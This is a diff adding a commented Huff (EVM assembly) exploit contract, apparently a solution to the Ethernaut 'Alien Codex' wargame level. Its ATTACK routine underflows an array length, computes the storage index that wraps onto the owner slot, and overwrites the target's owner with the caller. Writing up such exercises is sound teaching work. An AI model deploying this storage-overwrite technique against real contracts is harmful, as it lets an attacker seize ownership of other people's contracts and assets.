@@ -1,0 +1,281 @@
+// Storage 
+#define constant OWNER_SLOT = FREE_STORAGE_POINTER()
+#define constant INSTANCE_SLOT = FREE_STORAGE_POINTER()
+#define constant MAX_VAL = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+
+// Constructor
+#define macro CONSTRUCTOR() = takes (0) returns (0) {
+    // Copy caller into OWNER_SLOT in storage
+    caller          // [msg.sender] - msg.sender
+    [OWNER_SLOT]    // [0x00, msg.sender] OWNER_SLOT is the 0th slot in storage
+    sstore          // [] - sstore consumes top 2 stack items. The first item is
+                    // the key (storage location) and the second item is the value (item to store)
+
+    // Copy constructor argument (address) into memory
+    0x20            // [0x20] - This will be the size for the the code we will copy to memory
+    dup1            // [0x20, 0x20] - This will be used to calculate offset for which we will copy code from current environment
+    codesize        // [code_size, 0x20, 0x20] - codesize pushes the size of code in current environment on to stack
+    sub             // [offset, 0x20] - sub consumes top two items off stack and subtracts item 1 from item 2. Used to calculate offset for codecopy
+    returndatasize  // [0x00, offset, 0x20] - 0x00 is the destination offset in memory for the code we will copy
+    codecopy        // [] - codecopy consumes top 3 items off stack. codecopy(destOffset, offset, size)
+
+    // Copy address from memory into INSTANCE_SLOT in storage
+    returndatasize  // [0x00] - This is the offset in memory for which to copy 32 bytes from (our address param) 
+    mload           // [address_param] - mload consumes top item off stack and pushes 32 bytes from that offset in memory onto stack => mload(offset)
+    [INSTANCE_SLOT] // [0x01, address_param] - INSTANCE_SLOT is the 1st storage slot where we will store address_param
+    sstore          // [] - sstore consumes top two items off stack. sstore(key, value)
+}
+
+// Modifier
+#define macro ONLY_OWNER() = takes (0) returns (0) {
+    caller          // [msg.sender]
+    [OWNER_SLOT]    // [0x00] - storage slot where owner is stored
+    sload           // [owner] - loaded owner address onto stack from storage slot 0x00
+    eq              // [0/1] - consumes top two items and returns 1 if equal, 0 otherwise
+    is_owner        // [is_owner_label, 0/1] - byte offset in code for execution path
+    jumpi           // [] - consumes top two items and execution path jumps to is_owner_label if 2nd item is not 0
+
+    0x00            // [0x00] - size
+    0x00            // [0x00, 0x00] - byte offset
+    revert          // [] - reverts with data of size 0x00, starting from byte offset 0x00 in memory (reverts with no data)
+
+    is_owner:       // is_owner label. execution continues here is the caller is the owner
+}
+
+// "Internal" function
+#define macro MAKE_CALL() = takes(1) returns(1) {
+    0x00            // [0x00, instance] - size of return data (none)
+    0x00            // [0x00, 0x00, instance] - byte offset in memory where return data is copied
+    0x04            // [0x04, 0x00, 0x00, instance] - size of calldata
+    0x1c            // [0x1c, 0x04, 0x00, 0x00, instance] - byte offset in memory where calldata starts
+    0x00            // [0x00, 0x1c, 0x04, 0x00, 0x00, instance] - msg.value to send with call (none)
+    dup6            // [instance, 0x00, 0x1c, 0x04, 0x00, 0x00, instance] - calling instance
+    gas             // [gas, instance, 0x00, 0x1c, 0x04, 0x00, 0x00, instance] - gas to send with call (gasleft())
+    call            // [success, instance] - consumes top 7 items from stack and pushes 1 if call did not revert, 0 otherwise
+    iszero          // [0/1, instance]
+    throw_error     // [throw_error, 0/1, instance]
+    jumpi           // [instance]
+}
+
+// "Internal" function
+#define macro MAKE_STATICCALL() = takes(1) returns (1) {
+    0x20            // [0x20, instance, instance_owner] - size of return data
+    0x40            // [0x40, 0x20, instance, instance_owner] - byte offset in memory where return data is copied
+    0x04            // [0x04, 0x40, 0x20, instance, instance_owner] - size of calldata
+    0x7c            // [0x7c, 0x04, 0x40, 0x20, instance, instance_owner] - byte offset where calldata starts
+    dup5            // [instance, 0x7c, 0x04, 0x40, 0x20, instance, instance_owner] - calling instance
+    gas             // [gas, instance, 0x7c, 0x04, 0x40, 0x20, instance, instance_owner] - gas to send with call (gasleft())
+    staticcall      // [success, instance, instance_owner] - consumes 6 items off stack and pushes 1 if call was successful, 0 otherwise
+    iszero          // [0/1, instance, instance_owner]
+    throw_error     // [throw_error, 0/1, instance, instance_owner]
+    jumpi           // [instance, instance_owner]
+}
+
+// Attack function
+#define macro ATTACK() = takes(0) returns (0) {
+    // Copy `make_contact()` func sig into memory to use as calldata for CALL
+    0x58699c55      // [0x58699c55] - func sig for `make_contact()`
+    0x00            // [0x00, 0x58699c55] - byte offset
+    mstore          // [] - copied func sig into memory starting at offset 0x00
+
+    // MEMORY:
+    // [OFFSET 0]  0000000000000000000000000000000000000000000000000000000058699c55 -> `make_contact()` func sig
+
+    // CALL into instance - call with no params
+    [INSTANCE_SLOT] // [0x01] - storage slot where instance address is
+    sload           // [instance] - copied instance onto stack from storage slot 0x01
+    MAKE_CALL()
+
+    // Copy `contact()` func sig into memory to use as calldata for STATICCALL
+    0x33a8c45a      // [0x33a8c45a, instance] - func sig for `contact()`
+    0x00            // [0x20, 0x33a8c45a, instance] - byte offset
+    mstore          // [instance] - copied func sig to memory starting at offset 0x00
+
+    // MEMORY:
+    // [OFFSET 0]  0000000000000000000000000000000000000000000000000000000033a8c45a -> `contact()` func sig
+
+    // STATICCALL into instance
+    0x20            // [0x20, instance] - size of return data (bool)
+    0x20            // [0x20, 0x20, instance] - byte offset in memory where return data is copied
+    0x04            // [0x04, 0x20, 0x20, instance] - size of calldata
+    0x1c            // [0x1c, 0x04, 0x20, 0x20, instance] - byte offset in memory where calldata starts
+    dup5            // [instance, 0x1c, 0x04, 0x20, 0x20, instance] - calling instance
+    gas             // [gas, instance, 0x1c, 0x04, 0x20, 0x20, instance] - gas to send with call (gasleft())
+    staticcall      // [success, instance] - consumes top 6 items and pushes 1 onto stack if call was successful, 0 otherwise
+    iszero          // [0/1, instance]
+    throw_error     // [throw_error, 0/1, instance]
+    jumpi           // [instance]
+
+    // MEMORY:
+    // [OFFSET 0]  0000000000000000000000000000000000000000000000000000000033a8c45a -> `contact()` func sig
+    // [OFFSET 32] 0000000000000000000000000000000000000000000000000000000000000001 -> return data (bool)
+
+    // Check return data to verify that it is True (0x01)
+    0x20            // [0x20, instance] - byte offset
+    mload           // [return_data, instance] - copied return_data onto stack starting from byte offset 0x20 in memory
+    iszero          // [0/1, instance]
+    throw_error     // [throw_error, 0/1, instance]
+    jumpi           // [instance]
+
+    // Copy `retract()` func sig into memory to use as calldata for CALL
+    0x47f57b32      // [0x47f57b32, instance] - func sig for `retract()`
+    0x00            // [0x00, 0x47f57b32, instance] - byte offset
+    mstore          // [instance] - copied func is into memory starting at offset 0x00
+
+    // MEMORY:
+    // [OFFSET 0]  0000000000000000000000000000000000000000000000000000000047f57b32 -> `retract()` func sig
+    // [OFFSET 32] 0000000000000000000000000000000000000000000000000000000000000001 -> return data (bool)
+
+    // CALL into instance - call with no params
+    MAKE_CALL()
+
+    // Copy `codex(uint256)` and owner location into memory to use as calldata for STATICCALL
+    0x94bd7569      // [0x94bd7569, instance] - func sig for `codex(uint256)`
+    0x00            // [0x00, 0x94bd7569, instance] - byte offset
+    mstore          // [instance] - copied func sig into memory starting from offset 0x00
+
+    // Compute owner location
+    0x01            // [0x01, instance]
+    0x20            // [0x20, 0x01, instance] - size to read from memory
+    0x20            // [0x20, 0x20, 0x01, instance] - offset
+    sha3            // [hash, 0x01, instance] - hashed 32 bytes of data starting from offset 0x20 in memory and pushed result onto stack
+    [MAX_VAL]       // [max_value, hash, 0x01, instance]
+    sub             // [[max_value - hash], 0x01, instance]
+    add             // [[max_value - hash + 0x01], instance] => [owner_loc, instance]
+
+    // Copy owner loc into memory
+    0x20            // [0x20, owner_loc, instance] - byte offset
+    mstore          // [instance] - copied owner_loc into memory starting at offset 0x20
+
+    // MEMORY:
+    // [OFFSET 0]  0000000000000000000000000000000000000000000000000000000094bd7569 -> `codex(uint256)` func sig
+    // [OFFSET 32] 4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a -> owner_loc
+
+    // STATICCALL into instance
+    0x20           // [0x20, instance] - size of return data 
+    0x40           // [0x40, 0x20, instance] - byte offset in memory where return data is copied
+    0x24           // [0x24, 0x40, 0x20, instance] - size of calldata
+    0x1c           // [0x1c, 0x24, 0x40, 0x20, instance] - byte offset in memory where calldata starts
+    dup5           // [instance, 0x1c, 0x24, 0x40, 0x20, instance] - calling instance
+    gas            // [gas, instance, 0x1c, 0x24, 0x40, 0x20, instance] - gas to send with call (gasleft())
+    staticcall     // [success, instance] - consumes top 6 items and pushes 1 if call was successful, 0 otherwise
+    iszero         // [0/1, instance]
+    throw_error    // [throw_error, 0/1, instance]
+    jumpi          // [instance]
+
+    // MEMORY:
+    // [OFFSET 0]  0000000000000000000000000000000000000000000000000000000094bd7569 -> `codex(uint256)` func sig
+    // [OFFSET 32] 4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a -> owner_loc
+    // [OFFSET 64] 00000000000000000000000140055e69e7eb12620c8ccbccab1f187883301c30 -> return data (bool + instance owner)
+
+    // Copy return data onto stack for future comparison. Separate bool from address via bit shifting
+    0x40          // [0x40, instance] - byte offset
+    mload         // [return_data, instance] - copied return data onto stack starting from byte offset 0x40
+    0x60          // [0x60, return_data, instance] - # bits to shift left
+    shl           // [return_data_, instance] - shift return_data 0x60 bits left
+                  // 00000000000000000000000140055e69e7eb12620c8ccbccab1f187883301c30
+                  // 40055e69e7eb12620c8ccbccab1f187883301c30000000000000000000000000
+
+    0x60          // [0x60, return_data_, instance] - # bits to shift right
+    shr           // [instance_owner, instance] - shift return_data_ 0x60 bits right
+                  // 40055e69e7eb12620c8ccbccab1f187883301c30000000000000000000000000 
+                  // 00000000000000000000000040055e69e7eb12620c8ccbccab1f187883301c30
+
+    swap1         // [instance, instance_owner] - swap to feed stack into MAKE_STATICCALL()
+
+    // Copy `owner()` func sig into memory to use as calldata for STATICCALL
+    0x8da5cb5b    // [0x8da5cb5b, instance, instance_owner] - func sig for `owner()`
+    0x60          // [0x60, 0x8da5cb5b, instance, instance_owner] - byte offset
+    mstore        // [instance, instance_owner] - copied func sig to memory starting from 0x60
+
+    // MEMORY:
+    // [OFFSET 0]  0000000000000000000000000000000000000000000000000000000094bd7569 -> `codex(uint256)` func sig
+    // [OFFSET 32] 4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a -> owner_loc
+    // [OFFSET 64] 00000000000000000000000140055e69e7eb12620c8ccbccab1f187883301c30 -> return data (bool + instance owner)
+    // [OFFSET 96] 000000000000000000000000000000000000000000000000000000008da5cb5b -> `owner()` func sig
+
+    // STATICCALL into instance - owner() call
+    MAKE_STATICCALL() // [instance, instance_owner]
+    swap1             // [instance_owner, instance]
+
+    // MEMORY:
+    // [OFFSET 0]  0000000000000000000000000000000000000000000000000000000094bd7569 -> `codex(uint256)` func sig
+    // [OFFSET 32] 4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a -> owner_loc
+    // [OFFSET 64] 0000000000000000000000040055e69e7eb12620c8ccbccab1f187883301c30 -> return data (instance owner)
+    // [OFFSET 96] 000000000000000000000000000000000000000000000000000000008da5cb5b -> `owner()` func sig
+
+    // Check return data and verify it is equal to our previus return data
+    0x40            // [0x40 instance_owner, instance] - byte offset
+    mload           // [return_data, instance_owner, instance] - copied return data into memory starting at byte offset 0x40
+    xor             // [xor_value, instance] - consumes top two items and performs xor operation. Pushes 0 if items are equal
+    throw_error     // [throw_error, xor_value, instance]
+    jumpi           // [instance]  
+
+    // Copy `revise(uint256,bytes32)` and owner into memory to use as calldata for CALL
+    0x0339f300      // [0x0339f300, instance] - func sig for `revise(uint256,bytes32)`
+    0x00            // [0x00, 0x0339f300, instance] - byte offset
+    mstore          // [instance] - copied func sig into memory starting at offset 0x00
+    caller          // [owner, instance] - msg.sender is owner due to modifier
+    0x40            // [0x40, owner, instance] - byte offset
+    mstore          // [instance] - copied owner into memory starting at offset 0x40
+    
+    // MEMORY:
+    // [OFFSET 0]  000000000000000000000000000000000000000000000000000000000339f300 -> `revise(uint256,bytes32)` func sig
+    // [OFFSET 32] 4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a -> owner_loc
+    // [OFFSET 64] 0000000000000000000000001e59ce931b4cfea3fe4b875411e280e173cb7a9c -> owner (msg.sender)
+    // [OFFSET 96] 000000000000000000000000000000000000000000000000000000008da5cb5b -> `owner()` func sig
+
+    // CALL into instance
+    0x00            // [0x00, instance] - size of return data
+    0x00            // [0x00, 0x00, instance] - byte offset where return data is copied
+    0x44            // [0x44, 0x00, 0x00, instance] - size of calldata
+    0x1c            // [0x1c, 0x44, 0x00, 0x00, instance] - byte offset where calldata starts
+    0x00            // [value, 0x1c, 0x44, 0x00, 0x00, instance] - msg.value to send with call (none)
+    dup6            // [instance, value, 0x1c, 0x44, 0x00, 0x00, instance] - calling instance
+    gas             // [gas, instance, value, 0x1c, 0x44, 0x00, 0x00, instance] - gas to send with call (gasleft())
+    call            // [success, instance] - consumes top 7 items and pushes 1 if call did not revert, 0 otherwise
+    iszero          // [0/1, instance]
+    throw_error     // [throw_error, 0/1, instance]
+    jumpi           // [instance]
+
+    // STATICCALL into instance - owner() call
+    MAKE_STATICCALL() // [instance]
+
+    // MEMORY:
+    // [OFFSET 0]  000000000000000000000000000000000000000000000000000000000339f300 -> `revise(uint256,bytes32)` func sig
+    // [OFFSET 32] 4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a -> owner_loc
+    // [OFFSET 64] 0000000000000000000000001e59ce931b4cfea3fe4b875411e280e173cb7a9c -> return data 
+    // [OFFSET 96] 000000000000000000000000000000000000000000000000000000008da5cb5b -> `owner()` func sig
+
+    // Check return value and verify that  it is is equal to owner
+    0x40              // [0x40, instance] - byte offset
+    mload             // [return_data, instance] - copied return data onto stack starting from byte offset 0x40
+    caller            // [owner, return_data, instance] - msg.sender is owner due to modifier
+    xor               // [xor_value, instance] - consumes top two items and performs xor operation. Pushes 0 onto stack if items are equal
+    throw_error       // [throw_error, xor_value, instance]
+    jumpi             // [instance]
+    pop               // []
+}
+
+// Function Dispatching
+#define macro MAIN() = takes (0) returns (0) {
+    // Identify which function is being called
+    0x00         // [0x00] - the byte offset in calldata that we will read 32 bytes from
+    calldataload // [calldata] - calldataload consumes top item from stack and pushes 32 bytes of calldata, from byte offset, onto stack
+    0xe0         // [0xe0, calldata] - 0xe0 is 224 bits
+    shr          // [func_sig] - shr consumes top two items off the stack, performs a logical right shift and pushes resulting value of stack
+                 // Here we are shifting the calldata 224 bits to the right (256 - 224 = 32 bits = 4 bytes) and isolating the first 4 bytes (function sig)
+
+    dup1         // [func_sig, func_sig]
+    0x9e5faafc   // [0x9e5faafc, func_sig, func_sig] - pushing func sig of 'attack()' onto the stack
+    eq           // [0/1, func_sig] - eq consumes top two items from stack and pushes 1 onto stack if they are equal, otherwise 0
+    attack       // [attack_label, 0/1, func_sig] - attack_label is a label (byte offset) for the attack instructions
+    jumpi        // [func_sig] = jumpi consumes top two items from stack and jumps to new execution path if second item is not 0, otherwise executions continues on current path
+
+    throw_error: // label for revert path
+        0x00 0x00 revert
+
+    attack:      // label for attack instructions
+        ONLY_OWNER()
+        ATTACK()
+}
